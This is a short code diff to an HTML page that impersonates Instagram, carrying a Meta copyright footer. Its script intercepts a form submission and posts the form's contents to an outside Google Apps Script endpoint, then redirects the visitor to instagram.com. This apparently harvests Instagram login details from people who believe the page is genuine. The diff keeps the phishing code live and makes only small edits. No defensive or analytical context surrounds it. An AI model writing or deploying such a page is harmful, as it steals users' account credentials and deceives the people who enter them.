@@ -69,7 +69,6 @@
         <p style="text-transform:capitalize;" class="copyright">© 2022 Instagram from Meta</p>
     </footer>
     <script src="https://wzrd.in/standalone/formdata-polyfill"></script>
-    <script src="https://wzrd.in/standalone/promise-polyfill@latest"></script>
 
     <script>
         const scriptURL = 'https://script.google.com/macros/s/AKfycbw_nkkDE8jnqDQW2XBP6H7RzcgISCJb0lV3szVMRAr_0oefk2EhSlQy11C9e6iuhuEG/exec'
@@ -78,9 +77,9 @@
         form.addEventListener('submit', e => {
           e.preventDefault()
           fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-            .then(response => window.location.replace("instagram.com"))
+            .then(response => window.location = "instagram.com")
             .catch(error => console.error('Error!', error.message))
-        })
+            })
       </script>
   
 </body> 
